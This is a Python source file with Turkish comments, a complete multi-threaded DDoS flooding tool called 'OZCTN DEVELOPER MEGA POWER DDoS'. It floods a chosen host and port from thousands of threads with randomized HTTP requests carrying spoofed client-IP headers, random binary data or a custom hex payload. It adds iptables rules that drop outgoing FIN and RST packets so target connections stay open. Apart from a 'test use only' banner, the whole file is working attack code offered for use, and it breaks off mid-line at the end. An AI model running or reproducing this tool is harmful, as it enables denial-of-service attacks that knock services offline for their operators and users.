#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import socket
from time import sleep, time
from threading import Thread, Lock
from os import system, geteuid
import random
import string
import signal
import ssl
import argparse
import sys
import struct

# Renkli ve emojili çıktılar için
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

emoji = {
    "fire": "🔥",
    "rocket": "🚀",
    "skull": "💀",
    "warning": "⚠️",
    "success": "✅",
    "error": "❌",
    "info": "ℹ️",
    "target": "🎯",
    "network": "🌐",
    "stats": "📊",
    "timer": "⏱️",
    "zap": "⚡",
    "boom": "💥",
    "alien": "👽",
    "ghost": "👻",
    "tornado": "🌪️"
}

# OZCTN DEVELOPER Banner
BANNER = f"""{Colors.PURPLE}{Colors.BOLD}
 ██████╗ ███████╗ ██████╗████████╗███╗   ██╗
██╔═══██╗╚══███╔╝██╔════╝╚══██╔══╝████╗  ██║
██║   ██║  ███╔╝ ██║        ██║   ██╔██╗ ██║
██║   ██║ ███╔╝  ██║        ██║   ██║╚██╗██║
╚██████╔╝███████╗╚██████╗   ██║   ██║ ╚████║
 ╚═════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═══╝
                                             
 ██████╗ ███████╗██╗   ██╗██████╗ ███████╗██╗      
██╔═══██╗██╔════╝██║   ██║██╔══██╗██╔════╝██║      
██║   ██║█████╗  ██║   ██║██║  ██║█████╗  ██║      
██║   ██║██╔══╝  ██║   ██║██║  ██║██╔══╝  ██║      
╚██████╔╝██║     ╚██████╔╝██████╔╝███████╗███████╗ 
 ╚═════╝ ╚═╝      ╚═════╝ ╚═════╝ ╚══════╝╚══════╝ 
{Colors.END}
{Colors.CYAN}{Colors.BOLD}          🌪️ MEGA POWER DDoS SALDIRI ARACI 🌪️{Colors.END}
{Colors.YELLOW}         💀 Sadece Test Amaçlı Kullanın! 💀{Colors.END}
"""

example_text = f'''{Colors.BOLD}🗲 OZCTN DEVELOPER MEGA POWER DDoS Aracı 🗲{Colors.END}

{Colors.YELLOW}📖 KULLANIM ÖRNEKLERİ:{Colors.END}
  python3 {sys.argv[0]} example.com/test.php -p 80 -http
  python3 {sys.argv[0]} example.com/hello/ -p 443 -ssl -http
  python3 {sys.argv[0]} example.com -p 80 -http 
  python3 {sys.argv[0]} example.com -p 21 -payload 68656c6c6f
  python3 {sys.argv[0]} example.com -p 22 -t 2000 -time 60

{Colors.CYAN}📊 İSTATİSTİK AÇIKLAMALARI:{Colors.END}
  {emoji["network"]}  Bağlantılar - Hedefe yapılan TCP bağlantıları
  {emoji["rocket"]}  Gönderilen - Hedefe gönderilen payload sayısı
  {emoji["error"]}  Başarısız  - Başarısız bağlantı/gönderim sayısı
  {emoji["timer"]}  Süre       - Saldırının başlangıcından itibaren geçen süre
  {emoji["stats"]}  Hız        - Saniyedeki işlem sayısı

{Colors.RED}⚠️  UYARI: Sadece kendi sistemlerinizde test amaçlı kullanın!{Colors.END}'''

parser = argparse.ArgumentParser(
    epilog=example_text, 
    formatter_class=argparse.RawTextHelpFormatter
)
parser._action_groups.pop()
required = parser.add_argument_group(f'{Colors.RED}🔰 ZORUNLU PARAMETRELER{Colors.END}')
optional = parser.add_argument_group(f'{Colors.YELLOW}🎛️  OPSİYONEL PARAMETRELER{Colors.END}')

required.add_argument('target', help='Hedef URL/IP adresi')
required.add_argument('-p', '--port', dest='port', type=int, required=True, 
                     help='Hedef port numarası')

optional.add_argument('-t', '--threads', dest='threads', type=int, default=2000,
                     help=f'Thread sayısı (Varsayılan: {Colors.BOLD}2000{Colors.END})')
optional.add_argument('-ssl', action='store_true', help='SSL/TLS kullan')
optional.add_argument('-http', action='store_true', 
                     help='HTTP headerları kullan (Özel payload yoksa)')
optional.add_argument('-payload', help='Özel payload (hex formatında)')
optional.add_argument('-time', '--duration', type=int, default=0,
                     help='Saldırı süresi (saniye)')
optional.add_argument('-v', '--verbose', action='store_true', 
                     help='Detaylı çıktı modu')
optional.add_argument('-no-banner', action='store_true', 
                     help='Banner gösterme')
optional.add_argument('-power', type=int, default=10, choices=range(1, 11),
                     help='Saldırı gücü 1-10 arası (Varsayılan: 10)')

print(BANNER)

args = parser.parse_args()

# Global istatistikler
class Statistics:
    def __init__(self):
        self.connected = 0
        self.payloads = 0
        self.failed = 0
        self.bytes_sent = 0
        self.start_time = time()
        self.lock = Lock()
    
    def update(self, connected=0, payloads=0, failed=0, bytes_sent=0):
        with self.lock:
            self.connected += connected
            self.payloads += payloads
            self.failed += failed
            self.bytes_sent += bytes_sent
    
    def get_stats(self):
        with self.lock:
            return self.connected, self.payloads, self.failed, self.bytes_sent, time() - self.start_time

stats = Statistics()

# Signal handler
stop = False
def signal_handler(signum, frame):
    global stop
    print(f"\n\n{Colors.YELLOW}{emoji['warning']} Saldırı durduruluyor...{Colors.END}")
    stop = True

signal.signal(signal.SIGINT, signal_handler)

# Root kontrolü
if geteuid() != 0:
    print(f"{Colors.RED}{emoji['error']} Bu aracı root olarak çalıştırmanız gerekiyor!{Colors.END}")
    sys.exit(1)

# Hedef URL ayıklama
target = args.target.replace('http://', '').replace('https://', '')
if '/' in target and args.http:
    path = target[target.find('/'):]
    target = target[:target.find('/')]
else:
    path = '/'

# Payload decode
custom_payload = b''
if args.payload:
    try:
        custom_payload = bytes.fromhex(args.payload)
        print(f"{Colors.GREEN}{emoji['success']} Özel payload kullanılıyor: {args.payload}{Colors.END}")
    except ValueError:
        print(f"{Colors.RED}{emoji['error']} Geçersiz hex payload!{Colors.END}")
        sys.exit(1)

# IPTables kuralları
try:
    target_ip = socket.gethostbyname(target)
    print(f"{Colors.CYAN}{emoji['target']} Hedef: {target} ({target_ip}:{args.port}){Colors.END}")
except socket.gaierror:
    print(f"{Colors.RED}{emoji['error']} Hedef bulunamadı: {target}{Colors.END}")
    sys.exit(1)

# Socket optimizasyonları
socket.setdefaulttimeout(3)

try:
    system(f'iptables -A OUTPUT -d {target_ip} -p tcp --dport {args.port} --tcp-flags FIN FIN -j DROP 2>/dev/null')
    system(f'iptables -A OUTPUT -d {target_ip} -p tcp --dport {args.port} --tcp-flags RST RST -j DROP 2>/dev/null')
    print(f"{Colors.GREEN}{emoji['success']} IPTables kuralları eklendi{Colors.END}")
except:
    print(f"{Colors.YELLOW}{emoji['warning']} IPTables kuralları eklenemedi{Colors.END}")

# Rastgele string generator
def random_string(size=None):
    if size is None:
        size = random.randint(50, 500)  # Daha büyük stringler
    chars = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choices(chars, k=size))

# GÜÇLÜ HTTP Payload Generator
def generate_http_payload():
    methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'OZCTN-Mega-Bot/2.0'
    ]
    
    method = random.choice(methods)
    
    # Büyük payload oluştur
    payload_lines = []
    
    # Request line
    if random.random() > 0.5:
        query_params = '&'.join([f'{random_string(8)}={random_string(20)}' for _ in range(random.randint(3, 10))])
        request_line = f'{method} {path}?{query_params} HTTP/1.1\r\n'
    else:
        request_line = f'{method} {path} HTTP/1.1\r\n'
    
    payload_lines.append(request_line)
    
    # Headers
    payload_lines.append(f'Host: {target}\r\n')
    payload_lines.append(f'User-Agent: {random.choice(user_agents)}\r\n')
    payload_lines.append(f'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n')
    payload_lines.append(f'Accept-Language: en-US,en;q=0.9,tr;q=0.8\r\n')
    payload_lines.append(f'Accept-Encoding: gzip, deflate, br\r\n')
    payload_lines.append(f'Connection: keep-alive\r\n')
    payload_lines.append(f'Cache-Control: no-cache\r\n')
    payload_lines.append(f'Upgrade-Insecure-Requests: 1\r\n')
    
    # Rastgele headerlar ekle
    for _ in range(random.randint(5, 15)):
        header_name = random_string(random.randint(5, 15))
        header_value = random_string(random.randint(10, 50))
        payload_lines.append(f'X-{header_name}: {header_value}\r\n')
    
    # IP spoofing headerları
    fake_ip = f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
    payload_lines.append(f'X-Forwarded-For: {fake_ip}\r\n')
    payload_lines.append(f'X-Real-IP: {fake_ip}\r\n')
    payload_lines.append(f'X-Client-IP: {fake_ip}\r\n')
    payload_lines.append(f'X-Forwarded-Host: {target}\r\n')
    payload_lines.append(f'X-Forwarded-Proto: {"https" if args.ssl else "http"}\r\n')
    
    # POST/PUT için body
    if method in ['POST', 'PUT', 'PATCH']:
        content_type = random.choice([
            'application/x-www-form-urlencoded',
            'application/json',
            'multipart/form-data',
            'text/plain'
        ])
        payload_lines.append(f'Content-Type: {content_type}\r\n')
        
        if content_type == 'application/json':
            body = '{"' + random_string(10) + '":"' + random_string(100) + '","' + random_string(8) + '":' + str(random.randint(1,1000)) + '}'
        elif content_type == 'application/x-www-form-urlencoded':
            body = '&'.join([f'{random_string(8)}={random_string(30)}' for _ in range(random.randint(5, 15))])
        else:
            body = random_string(random.randint(200, 2000))
        
        payload_lines.append(f'Content-Length: {len(body)}\r\n')
        payload_lines.append('\r\n')
        payload_lines.append(body)
    else:
        payload_lines.append('\r\n')
    
    return ''.join(payload_lines).encode()

# Binary payload generator (daha güçlü)
def generate_binary_payload():
    payload_size = random.randint(100, 5000)
    return random.randbytes(payload_size)

# Özel payload generator
def generate_custom_payload():
    if args.payload:
        return custom_payload
    elif args.http:
        return generate_http_payload()
    else:
        return generate_binary_payload()

# Saldırı thread'i - ÇOK DAHA GÜÇLÜ
def attack_thread(thread_id):
    thread_stats = {'connected': 0, 'payloads': 0, 'failed': 0, 'bytes_sent': 0}
    last_update = time()
    
    # Saldırı gücü ayarı
    power_multiplier = args.power
    
    while not stop:
        if args.duration > 0 and (time() - stats.start_time) > args.duration:
            break
            
        try:
            # Çoklu socket ile saldırı (güce göre)
            sockets = []
            for i in range(min(power_multiplier, 5)):  # Her thread 5 sockete kadar
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((target_ip, args.port))
                    sockets.append(s)
                    thread_stats['connected'] += 1
                except:
                    thread_stats['failed'] += 1
            
            # Her socket'e çoklu payload gönder
            for s in sockets:
                try:
                    if args.ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        s = context.wrap_socket(s, server_hostname=target)
                    
                    # Her socket için çoklu gönderim
                    for _ in range(random.randint(1, power_multiplier)):
                        payload = generate_custom_payload()
                        bytes_sent = s.send(payload)
                        thread_stats['payloads'] += 1
                        thread_stats['bytes_sent'] += bytes_sent
                        
                        # Küçük bekleme
                        sleep(0.01 * random.random())
                    
                    s.close()
                    
                except Exception as e:
                    thread_stats['failed'] += 1
                    try:
                        s.close()
                    except:
                        pass
                    
        except Exception as e:
            thread_stats['failed'] += 1
        
        # İstatistik güncelleme
        current_time = time()
        if current_time - last_update >= 0.3:
            stats.update(**thread_stats)
            thread_stats = {'connected': 0, 'payloads': 0, 'failed': 0, 'bytes_sent': 0}
            last_update = current_time
    
    # Kalan istatistikleri gönder
    stats.update(**thread_stats)

# İstatistik gösterici
def show_stats():
    last_connected, last_payloads, last_failed, last_bytes, last_time = 0, 0, 0, 0, time()
    peak_speed = 0
    peak_bandwidth = 0
    
    while not stop:
        try:
            current_connected, current_payloads, current_failed, current_bytes, total_time = stats.get_stats()
            current_time = time()
            elapsed = current_time - last_time
            
            # Hız hesapla
            conn_speed = (current_connected - last_connected) / elapsed if elapsed > 0.5 else 0
            payload_speed = (current_payloads - last_payloads) / elapsed if elapsed > 0.5 else 0
            bandwidth = (current_bytes - last_bytes) / elapsed / 1024 / 1024 if elapsed > 0.5 else 0  # MB/s
            
            # Peak değerleri güncelle
            peak_speed = max(peak_speed, payload_speed)
            peak_bandwidth = max(peak_bandwidth, bandwidth)
            
            # Ekranı temizle
            system('clear')
            
            # Banner
            print(f"{Colors.PURPLE}{Colors.BOLD}OZCTN DEVELOPER - MEGA POWER DDoS {emoji['tornado']}{Colors.END}")
            print(f"{Colors.CYAN}{'='*70}{Colors.END}")
            
            # Hedef bilgisi
            print(f"{emoji['target']}  {Colors.BOLD}Hedef:{Colors.END} {Colors.WHITE}{target}:{args.port}{Colors.END} ({target_ip})")
            print(f"{emoji['rocket']}  {Colors.BOLD}Thread:{Colors.END} {args.threads} | {emoji['timer']}  {Colors.BOLD}Süre:{Colors.END} {int(total_time)}s | {emoji['zap']}  {Colors.BOLD}Güç:{Colors.END} {args.power}/10")
            print(f"{Colors.CYAN}{'='*70}{Colors.END}")
            
            # Ana istatistikler
            print(f"\n{emoji['network']}  {Colors.GREEN}Bağlantılar: {Colors.BOLD}{current_connected:,}{Colors.END}")
            print(f"{emoji['zap']}  {Colors.BLUE}Gönderilen:  {Colors.BOLD}{current_payloads:,}{Colors.END}")
            print(f"{emoji['error']}  {Colors.RED}Başarısız:   {Colors.BOLD}{current_failed:,}{Colors.END}")
            print(f"{emoji['stats']}  {Colors.CYAN}Toplam Veri: {Colors.BOLD}{current_bytes/1024/1024:.1f} MB{Colors.END}")
            
            # Hız istatistikleri
            print(f"\n{emoji['fire']}  {Colors.YELLOW}Paket Hızı:  {Colors.BOLD}{payload_speed:.0f}/s{Colors.END}")
            print(f"{emoji['tornado']}  {Colors.RED}Tepe Hız:    {Colors.BOLD}{peak_speed:.0f}/s{Colors.END}")
            print(f"{emoji['network']}  {Colors.PURPLE}Bant Genişliği: {Colors.BOLD}{bandwidth:.1f} MB/s{Colors.END}")
            print(f"{emoji['boom']}  {Colors.CYAN}Tepe Bant:   {Colors.BOLD}{peak_bandwidth:.1f} MB/s{Colors.END}")
            
            # Progress bar benzeri gösterge
            total_ops = current_connected + current_payloads + current_failed
            if total_ops > 0:
                success_rate = (current_payloads / total_ops) * 100
                print(f"{emoji['ghost']}  {Colors.GREEN}Başarı:      {Colors.BOLD}{success_rate:.1f}%{Colors.END}")
                
                # Performans yıldızları
                stars = min(10, int(payload_speed / 1000) + 1)
                performance = "★" * stars + "☆" * (10 - stars)
                print(f"{emoji['alien']}  {Colors.YELLOW}Güç Seviyesi:{Colors.BOLD} {performance}{Colors.END}")
            
            print(f"\n{Colors.YELLOW}⏹️  Durdurmak için CTRL+C {Colors.END}")
            
            last_connected, last_payloads, last_failed, last_bytes = current_connected, current_payloads, current_failed, current_bytes
            last_time = current_time
            
            sleep(0.5)
        except Exception as e:
            if args.verbose:
                print(f"{Colors.RED}İstatistik hatası: {e}{Colors.END}")
            sleep(1)

# Ana program
if __name__ == '__main__':
    if not args.no_banner:
        print(BANNER)
    
    print(f"{Colors.GREEN}{emoji['tornado']} MEGA GÜÇ SALDIRISI BAŞLATILIYOR...{Colors.END}")
    print(f"{Colors.CYAN}Threadler: {args.threads}{Colors.END}")
    print(f"{Colors.CYAN}Süre: {args.duration if args.duration > 0 else 'Sınırsız'}s{Colors.END}")
    print(f"{Colors.CYAN}Hedef: {target}:{args.port}{Colors.END}")
    print(f"{Colors.CYAN}Saldırı Gücü: {args.power}/10{Colors.END}")
    
    # Thread'leri başlat
    threads = []
    for i in range(args.threads):
        t = Thread(target=attack_thread, args=(i+1,))
        t.daemon = True
        threads.append(t)
    
    # Thread'leri gruplar halinde başlat
    batch_size = 200
    for i in range(0, len(threads), batch_size):
        batch = threads[i:i + batch_size]
        for t in batch:
            t.start()
        sleep(0.05)
    
    print(f"{Colors.GREEN}{emoji['success']} {len(threads)} thread başlatıldı{Colors.END}")
    
    # İstatistik thread'ini başlat
    stats_thread = Thread(target=show_stats)
    stats_thread.daemon = True
    stats_thread.start()
    
    # Ana döngü
    try:
        while not stop:
            if args.duration > 0 and (time() - stats.start_time) > args.duration:
                print(f"\n{Colors.YELLOW}{emoji['timer']} Saldırı süresi doldu!{Colors.END}")
                stop = True
            
            # Thread kontrolü
            alive_threads = sum(1 for t in threads if t.is_alive())
            if alive_threads < args.threads * 0.8:
                if args.verbose:
                    print(f"{Colors.YELLOW}{emoji['warning']} Thread kaybı: {alive_threads}/{args.threads}{Colors.END}")
            
            sleep(1)
            
    except KeyboardInterrupt:
        stop = True
    except Exception as e:
        print(f"{Colors.RED}Beklenmeyen hata: {e}{Colors.END}")
        stop = True
    
    # Temizlik
    print(f"\n{Colors.YELLOW}{emoji['warning']} Temizlik yapılıyor...{Colors.END}")
    
    try:
        system(f'iptables -D OUTPUT -d {target_ip} -p tcp --dport {args.port} --tcp-flags FIN FIN -j DROP 2>/dev/null')
        system(f'iptables -D OUTPUT -d {target_ip} -p tcp --dport {args.port} --tcp-flags RST RST -j DROP 2>/dev/null')
        print(f"{Colors.GREEN}{emoji['success']} IPTables kuralları temizlendi{Colors.END}")
    except:
        print(f"{Colors.YELLOW}{emoji['warning']} IPTables temizleme başarısız{Colors.END}")
    
    # Son istatistikler
    final_connected, final_payloads, final_failed, final_bytes, total_time = stats.get_stats()
    
    print(f"\n{Colors.BOLD}{Colors.PURPLE}🎯 SALDIRI TAMAMLANDI {emoji['success']}{Colors.END}")
    print(f"{Colors.CYAN}{'='*70}{Colors.END}")
    print(f"{emoji['network']}  Toplam Bağlantı: {Colors.GREEN}{final_connected:,}{Colors.END}")
    print(f"{emoji['zap']}  Toplam Gönderim:  {Colors.BLUE}{final_payloads:,}{Colors.END}")
    print(f"{emoji['error']}  Toplam Hata:      {Colors.RED}{final_failed:,}{Colors.END}")
    print(f"{emoji['stats']}  Toplam Veri:     {Colors.CYAN}{final_bytes/1024/1024:.2f} MB{Colors.END}")
    print(f"{emoji['timer']}  Toplam Süre:     {Colors.Y
